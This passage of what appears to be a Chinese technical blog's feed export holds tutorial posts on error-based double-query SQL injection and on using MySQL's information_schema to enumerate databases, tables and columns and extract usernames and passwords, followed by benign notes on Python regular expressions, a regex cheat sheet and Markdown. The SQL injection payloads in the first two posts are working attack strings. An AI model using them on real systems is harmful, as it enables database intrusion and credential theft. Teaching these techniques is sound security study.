      <content type="html"><![CDATA[<h1 id="双查询注入简介"><a href="#双查询注入简介" class="headerlink" title="双查询注入简介"></a>双查询注入简介</h1><p>双查询注入简单而言，就是一个select语句中还有一个select语句</p>
<h1 id="双查询注入基本函数"><a href="#双查询注入基本函数" class="headerlink" title="双查询注入基本函数"></a>双查询注入基本函数</h1><h2 id="rand-函数"><a href="#rand-函数" class="headerlink" title="rand()函数"></a>rand()函数</h2><p>rand函数是一个随机函数，它的作用是可以产生0~1之间的任意随机数。</p>
<h2 id="floor-函数"><a href="#floor-函数" class="headerlink" title="floor()函数"></a>floor()函数</h2><p>floor函数是一个取整函数，结果返回小于等于你输入的数的整数。只返回数值的整数部分，小数部分忽略</p>
<h2 id="concat（）函数"><a href="#concat（）函数" class="headerlink" title="concat（）函数"></a>concat（）函数</h2><p>concat是一个连接函数，可以将两个字符串拼接为一个字符串。</p>
<h2 id="count-函数"><a href="#count-函数" class="headerlink" title="count(*)函数"></a>count(*)函数</h2><p>count(*)是一个统计行的函数，可以计算出由select语句返回的结果集中的行数。</p>
<h1 id="固定注入公式"><a href="#固定注入公式" class="headerlink" title="固定注入公式"></a>固定注入公式</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,( 注入语句),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from (select count(*), concat(&apos;~&apos;,(select user()),&apos;~&apos;, floor(rand()2))as a from information_schema.tables group by a)x;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之information_schema库]]></title>
      <url>/2019/08/15/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Binformation-schema%E5%BA%93/</url>
      <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
<h1 id="information-schema简介"><a href="#information-schema简介" class="headerlink" title="information_schema简介"></a>information_schema简介</h1><p>每种数据库语言都有着自己第一无二的特性，mysql也不例外。在mysql数据库中,informationschema 是 mysql 自 带 的 元 数 据 库 ， 是 每 个 mysql 实 例 中 的 数 据 库 ， 通 过 它 我 们 能 够 找 到 mysql 数 据 库 中 所 有 的 数 据 信 息。</p>
<p><strong>注：information_schema是在sql5.0版本之后才有的，5.0之前需要只能暴力去跑。</strong></p>
<blockquote>
<h3 id="informaton-schema-是mysql数据库内置自带的元数据库"><a href="#informaton-schema-是mysql数据库内置自带的元数据库" class="headerlink" title="informaton_schema:是mysql数据库内置自带的元数据库"></a>informaton_schema:是mysql数据库内置自带的元数据库</h3></blockquote>
<h2 id="schemata表"><a href="#schemata表" class="headerlink" title="schemata表"></a>schemata表</h2><p>包含了mysql数据库中所有的数据库信息，相等于我们上述的show databases操作。我们可以通过schemata表来获取mysql中所以数据 库名信息。</p>
<p>通过sql自带的informaton_schema查询有哪些数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><code>group_concat是一个字符串连接函数，查询结果通过逗号分离。
-- 是sql注释符(--后面有一个空格)url中+等于空格所以通常用--+来注释后面内容</code></p>
<h2 id="tables表"><a href="#tables表" class="headerlink" title="tables表"></a>tables表</h2><p>包含了mysql数据库中的所有表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema=<span class="string">'security'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="columns表"><a href="#columns表" class="headerlink" title="columns表"></a>columns表</h2><p>包含了mysql表中所有数据列的信息。详细表述了某张表的所有列以及每个列的信息。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="查询敏感信息"><a href="#查询敏感信息" class="headerlink" title="查询敏感信息"></a>查询敏感信息</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span><span class="comment">--+</span></span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span><span class="comment">--+</span></span><br><span class="line">查询出账号密码。</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python 正则表达式应用]]></title>
      <url>/2019/08/09/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>关于正则表达式的内容可以参考“正则表达式”文章。这一篇是关于Python re模块的基本使用方法。</p>
<h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><h2 id="函数说明："><a href="#函数说明：" class="headerlink" title="函数说明："></a>函数说明：</h2><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>pattern</td>
<td>匹配的正则表达式</td>
</tr>
<tr>
<td>string</td>
<td>要匹配的字符串。</td>
</tr>
<tr>
<td>flags</td>
<td>标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>
</tr>
<tr>
<td>repl</td>
<td>替换的字符串，也可为一个函数。</td>
</tr>
<tr>
<td>count</td>
<td>模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</td>
</tr>
<tr>
<td>pos</td>
<td>指定字符串的起始位置，默认为 0</td>
</tr>
<tr>
<td>endpos</td>
<td>指定字符串的结束位置，默认为字符串的长度</td>
</tr>
<tr>
<td>maxsplit</td>
<td>分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数</td>
</tr>
</tbody></table>
<h2 id="修饰符（flags）"><a href="#修饰符（flags）" class="headerlink" title="修饰符（flags）"></a>修饰符（flags）</h2><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>re.I</td>
<td>使匹配对大小写不敏感</td>
</tr>
<tr>
<td>re.L</td>
<td>做本地化识别（locale-aware）匹配</td>
</tr>
<tr>
<td>re.M</td>
<td>多行匹配，影响 ^ 和 $</td>
</tr>
<tr>
<td>re.S</td>
<td>使 . 匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td>re.U</td>
<td>根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td>
</tr>
<tr>
<td>re.X</td>
<td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</td>
</tr>
</tbody></table>
<h2 id="正则表达式对象"><a href="#正则表达式对象" class="headerlink" title="正则表达式对象"></a>正则表达式对象</h2><blockquote>
<p>re.RegexObject</p>
</blockquote>
<blockquote>
<blockquote>
<p>compile() 返回 RegexObject 对象。</p>
</blockquote>
</blockquote>
<blockquote>
<p>re.MatchObject</p>
</blockquote>
<blockquote>
<blockquote>
<p>group() 返回被 RE 匹配的字符串。</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>start() 返回匹配开始的位置</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>end() 返回匹配结束的位置</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>span() 返回一个元组包含匹配 (开始,结束) 的位置</p>
</blockquote>
</blockquote>
<h2 id="获取匹配表达式"><a href="#获取匹配表达式" class="headerlink" title="获取匹配表达式"></a>获取匹配表达式</h2><p>我们可以使用group(num) 或groups() 匹配对象函数来获取匹配表达式。</p>
<table>
<thead>
<tr>
<th>匹配对象方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>group(num=0)</td>
<td>匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
</tr>
<tr>
<td>groups()</td>
<td>返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
</tr>
</tbody></table>
<h1 id="re-模块的使用"><a href="#re-模块的使用" class="headerlink" title="re 模块的使用"></a>re 模块的使用</h1><h2 id="re-match方法"><a href="#re-match方法" class="headerlink" title="re.match方法"></a>re.match方法</h2><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：re.match(pattern, string[, flags])</span><br></pre></td></tr></table></figure>

<h2 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h2><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：re.search(pattern, string[,flags])</span><br></pre></td></tr></table></figure>

<h2 id="re-match方法与re-search方法区别"><a href="#re-match方法与re-search方法区别" class="headerlink" title="re.match方法与re.search方法区别"></a>re.match方法与re.search方法区别</h2><blockquote>
<p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>
</blockquote>
<h2 id="re-sub方法"><a href="#re-sub方法" class="headerlink" title="re.sub方法"></a>re.sub方法</h2><p>re.sub用于替换字符串中的匹配项。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：re.sub(pattern, repl, string[, count])</span><br></pre></td></tr></table></figure>

<h2 id="re-compile-方法"><a href="#re-compile-方法" class="headerlink" title="re.compile 方法"></a>re.compile 方法</h2><p>re.compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：re.compile(pattern[, flags])</span><br></pre></td></tr></table></figure>

<h2 id="re-findall方法"><a href="#re-findall方法" class="headerlink" title="re.findall方法"></a>re.findall方法</h2><p>re.findall在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</p>
<p><code>match 和 search 是匹配一次findall 匹配所有。</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法: findall(string[, pos, endpos])</span><br></pre></td></tr></table></figure>

<h2 id="re-finditer方法"><a href="#re-finditer方法" class="headerlink" title="re.finditer方法"></a>re.finditer方法</h2><p>re.finditer在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：re.finditer(pattern, string[, flags])</span><br></pre></td></tr></table></figure>

<h2 id="re-split方法"><a href="#re-split方法" class="headerlink" title="re.split方法"></a>re.split方法</h2><p>re.split 方法按照能够匹配的子串将字符串分割后返回列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：re.split(pattern, string[, maxsplit, flags])</span><br></pre></td></tr></table></figure>

<h2 id="re-escape方法"><a href="#re-escape方法" class="headerlink" title="re.escape方法"></a>re.escape方法</h2><p>将字符串中所有可能被解释为正则运算符的字符进行转译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：re.escape(pattern)</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> 正则 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[正则表达式]]></title>
      <url>/2019/08/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑，可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<h1 id="正则表达式基础"><a href="#正则表达式基础" class="headerlink" title="正则表达式基础"></a>正则表达式基础</h1><h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><p>普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。</p>
<h2 id="非打印字符（转义）"><a href="#非打印字符（转义）" class="headerlink" title="非打印字符（转义）"></a>非打印字符（转义）</h2><p>表达式中一些字符需要在前面加 “”（既\） 进行转义</p>
<table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\n</td>
<td align="center">匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td align="center">\r</td>
<td align="center">匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td align="center">\t</td>
<td align="center">匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td align="center">\</td>
<td align="center">代表   “” 本身</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">^本身</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">$本身</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">.本身</td>
</tr>
</tbody></table>
<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$</td>
<td align="center">匹配输入字符串的结尾位置、不匹配任何字符</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">匹配输入字符串的开始位置、不匹配任何字符</td>
</tr>
<tr>
<td align="center">( )</td>
<td align="center">标记一个子表达式的开始和结束位置</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">指明两项之间的一个选择、匹配左边或者右边</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">匹配除换行符 \n 之外的任何单字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td align="center">匹配一个单词边界，即字与空格间的位置</td>
</tr>
<tr>
<td align="center">\B</td>
<td align="center">非单词边界匹配</td>
</tr>
</tbody></table>
<ol>
<li><p>表达式 “^aaa” 在匹配 “xxx aaa xxx” 时，匹配结果是：失败。因为 “^” 要求与字符串开始的地方匹配，因此，只有当 “aaa” 位于字符串的开头的时候，”^aaa” 才能匹配，比如：”aaa xxx xxx”。</p>
</li>
<li><p>表达式 “aaa$”在匹配“xxxaaaxxx”时，匹配结果是： 失败。因为“”要求与字符串结束的地方匹配，因此， 只有当 “aaa” 位于字符串的结尾的时候，”aaa$” 才能匹配，比如：”xxx xxx aaa”。</p>
</li>
<li><p>表达式 “.\b.” 在匹配 “@@@abc” 时，匹配结果是：成功；匹配到的内容是：”@a”；匹配到的位置是：开始于2，结束于4。</p>
</li>
<li><p>表达式 “Tom|Jack” 在匹配字符串 “I’m Tom, he is Jack” 时，匹配结果是：成功；匹配到的内容是：”Tom”； 匹配到的位置是：开始于4，结束于7。匹配下一个时，匹配结果是：成功；匹配到的内容是：”Jack”；匹配到的位置  时：开始于15，结束于19。</p>
</li>
</ol>
<p>说明：”\b” 与 “^” 和 “$” 类似，本身不匹配任何字符，但是它要求它在匹配结果中所处位置的左右两边，其中一边是 “\w” 范围，另一边是 非”\w” 的范围。                                                                      </p>
<h2 id="匹配次数"><a href="#匹配次数" class="headerlink" title="匹配次数"></a>匹配次数</h2><table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">*</td>
<td align="center">匹配前面的子表达式零次或多次等价于{0,}</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">匹配前面的子表达式一次或多次等价于 {1,}</td>
</tr>
<tr>
<td align="center">?</td>
<td align="center">匹配前面的子表达式零次或一次等价于 {0,1}</td>
</tr>
<tr>
<td align="center">{n}</td>
<td align="center">n 是一个非负整数。匹配确定的 n   次。</td>
</tr>
<tr>
<td align="center">{m,n}</td>
<td align="center">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td>
</tr>
<tr>
<td align="center">{n,}</td>
<td align="center">n 是一个非负整数。至少匹配n 次。</td>
</tr>
</tbody></table>
<ol>
<li><p>zo* 能匹配 “z” 以及 “zoo”</p>
</li>
<li><p>“a+b”可以匹配 “ab”,”aab”,”aaab”</p>
</li>
<li><p>“do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do”</p>
</li>
<li><p>‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o</p>
</li>
<li><p>‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o</p>
</li>
<li><p>“o{1,3}” 将匹配 “fooooood” 中的前三个 o</p>
</li>
</ol>
<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\w</td>
<td align="center">任意一个字母或数字或下划线，也就是   A<del>Z,a</del>z,0~9,_ 中任意一个</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="center">包括空格、制表符、换页符等空白字符的其中任意一个</td>
</tr>
<tr>
<td align="center">\d</td>
<td align="center">任意一个数字，0~9 中的任意一个</td>
</tr>
<tr>
<td align="center">\W</td>
<td align="center">匹配所有的字母、数字、下划线以外的字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td align="center">匹配所有的非数字字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td align="center">匹配任何可见字符</td>
</tr>
</tbody></table>
<p>在表达式 “\s”，”\d”，”\w”，”\b” 表示特殊意义的同时，对应的大写字母表示相反的意义。</p>
<h1 id="正则表达式进阶"><a href="#正则表达式进阶" class="headerlink" title="正则表达式进阶"></a>正则表达式进阶</h1><h2 id="贪婪与非贪婪"><a href="#贪婪与非贪婪" class="headerlink" title="贪婪与非贪婪"></a>贪婪与非贪婪</h2><p>针对文本 “dxxxdxxxd”</p>
<p>贪婪模式:总是尽可能多的匹配</p>
<table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">d\w+</td>
<td align="center">“\w+” 将匹配第一个 “d” 之后的所有字符   “xxxdxxxd”</td>
</tr>
<tr>
<td align="center">d\w+d</td>
<td align="center">“\w+” 将匹配第一个 “d” 和最后一个 “d” 之间的所有字符 “xxxdxxx”。虽然 “\w+” 也能够匹配上最后一个 “d”，但是为了使整个表达式匹配成功，”\w+”   可以 “让出” 它本来能够匹配的最后一个 “d”。</td>
</tr>
</tbody></table>
<p>非贪婪模式: 在修饰匹配次数的特殊符号后再加上一个 “?” 号，则可以使匹配次数不定的表达式尽可能少的匹配，使可匹配可不匹配的表达式，尽可能的 “不匹配”。</p>
<table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">d\w+</td>
<td align="center">“\w+?” 将尽可能少的匹配第一个 “d” 之后的字符，结果是：”\w+?” 只匹配了一个 “x”</td>
</tr>
<tr>
<td align="center">d\w+d</td>
<td align="center">为了让整个表达式匹配成功，”\w+?” 不得不匹配 “xxx” 才可以让后边的 “d” 匹配，从而使整个表达式匹配成功。   因此，结果是：”\w+?” 匹配 “xxx”。</td>
</tr>
</tbody></table>
<h1 id="常用表达式"><a href="#常用表达式" class="headerlink" title="常用表达式"></a>常用表达式</h1><h2 id="数字类"><a href="#数字类" class="headerlink" title="数字类"></a>数字类</h2><ol>
<li>数字：^[0-9]*$</li>
</ol>
<ol start="2">
<li>n位的数字：^\d{n}$</li>
</ol>
<ol start="3">
<li>至少n位的数字：^\d{n,}$</li>
</ol>
<ol start="4">
<li>m-n位的数字：^\d{m,n}$</li>
</ol>
<ol start="5">
<li>零和非零开头的数字：^(0|[1-9][0-9]*)$</li>
</ol>
<ol start="6">
<li>非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$</li>
</ol>
<ol start="7">
<li>带1-2位小数的正数或负数：^(-)?\d+(.\d{1,2})?$</li>
</ol>
<ol start="8">
<li>正数、负数、和小数：^(-|+)?\d+(.\d+)?$</li>
</ol>
<ol start="9">
<li>有两位小数的正实数：^[0-9]+(.[0-9]{2})?$</li>
</ol>
<ol start="10">
<li>有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$</li>
</ol>
<ol start="11">
<li>非零的正整数：^[1-9]\d<em>$ 或 ^([1-9][0-9]</em>){1,3}$ 或 ^+?[1-9][0-9]*$</li>
</ol>
<ol start="12">
<li>非零的负整数：^-[1-9][]0-9”<em>$ 或 ^-[1-9]\d</em>$</li>
</ol>
<ol start="13">
<li>非负整数：^\d+$ 或 ^[1-9]\d*|0$</li>
</ol>
<ol start="14">
<li>非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$</li>
</ol>
<ol start="15">
<li>非负浮点数：^\d+(.\d+)?$ 或 ^[1-9]\d<em>.\d</em>|0.\d<em>[1-9]\d</em>|0?.0+|0$</li>
</ol>
<ol start="16">
<li>非正浮点数：^((-\d+(.\d+)?)|(0+(.0+)?))$ 或 ^(-([1-9]\d<em>.\d</em>|0.\d<em>[1-9]\d</em>))|0?.0+|0$</li>
</ol>
<ol start="17">
<li>正浮点数：^[1-9]\d<em>.\d</em>|0.\d<em>[1-9]\d</em>$ 或 ^(([0-9]+.[0-9]<em>[1-9][0-9]</em>)|([0-9]<em>[1-9][0-9]*.[0-9]+)|([0-9]</em>[1-9][0-9]*))$</li>
</ol>
<ol start="18">
<li>负浮点数：^-([1-9]\d<em>.\d</em>|0.\d<em>[1-9]\d</em>)$ 或 ^(-(([0-9]+.[0-9]<em>[1-9][0-9]</em>)|([0-9]<em>[1-9][0-9]*.[0-9]+)|([0-9]</em>[1-9][0-9]*)))$</li>
</ol>
<ol start="19">
<li>浮点数：^(-?\d+)(.\d+)?$ 或 ^-?([1-9]\d<em>.\d</em>|0.\d<em>[1-9]\d</em>|0?.0+|0)$</li>
</ol>
<h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><ol>
<li>汉字：^[\u4e00-\u9fa5]{0,}$</li>
</ol>
<ol start="2">
<li>英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$</li>
</ol>
<ol start="3">
<li>长度为3-20的所有字符：^.{3,20}$</li>
</ol>
<ol start="4">
<li>由26个英文字母组成的字符串：^[A-Za-z]+$</li>
</ol>
<ol start="5">
<li>由26个大写英文字母组成的字符串：^[A-Z]+$</li>
</ol>
<ol start="6">
<li>由26个小写英文字母组成的字符串：^[a-z]+$</li>
</ol>
<ol start="7">
<li>由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$</li>
</ol>
<ol start="8">
<li>由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$</li>
</ol>
<ol start="9">
<li>中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$</li>
</ol>
<ol start="10">
<li>中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$</li>
</ol>
<ol start="11">
<li>可以输入含有^%&amp;’,;=?$&quot;等字符：[^%&amp;’,;=?$\x22]+ 12 禁止输入含有<del>的字符：[^</del>\x22]+</li>
</ol>
<h2 id="特殊类"><a href="#特殊类" class="headerlink" title="特殊类"></a>特殊类</h2><p>\1. Email地址：^\w+([-+.]\w+)<em>@\w+([-.]\w+)*.\w+([-.]\w+)</em>$</p>
<p>\2. 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?</p>
<p>\3. InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+.)+[\w-]+(/[\w-./?%&amp;=]*)?$</p>
<p>\4. 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$</p>
<p>\5. 电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：^((\d{3,4}-)|\d{3.4}-)?\d{7,8}$</p>
<p>\6. 国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7}</p>
<p>\7. 身份证号(15位、18位数字)：^\d{15}|\d{18}$</p>
<p>\8. 短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$</p>
<p>\9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$</p>
<p>\10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$</p>
<p>\11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.<em>\d)(?=.</em>[a-z])(?=.*[A-Z]).{8,10}$</p>
<p>\12. 日期格式：^\d{4}-\d{1,2}-\d{1,2}</p>
<p>\13. 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$</p>
<p>\14. 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$</p>
<p>\15. 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始)</p>
<p>\16. 中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字)</p>
<p>\17. IP地址：\d+.\d+.\d+.\d+ (提取IP地址时有用)</p>
<p>\18. IP地址：((?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d?\d))</p>
<p>\19. 银行卡号: /^([1-9]{1})(\d{14}|\d{18})$/</p>
<p>\20. 钱的输入格式：</p>
<p>A．有四种钱的表示形式我们可以接受:”10000.00” 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：^[1-9][0-9]*$</p>
<p>B．这表示任意一个不以0开头的数字,但是,这也意味着一个字符”0”不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$</p>
]]></content>
      
        <categories>
            
            <category> 正则 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 正则 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Markdown常用语法]]></title>
      <url>/2019/08/06/Markdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="Markdown简介"><a href="#Markdown简介" class="headerlink" title="Markdown简介"></a>Markdown简介</h1><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的HTML页面，Markdown文件的后缀名便是“.md”。</p>
<h1 id="Markdown使用"><a href="#Markdown使用" class="headerlink" title="Markdown使用"></a>Markdown使用</h1><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><pre><code># 标题H1

## 标题H2

### 标题H3

#### 标题H4

##### 标题H5

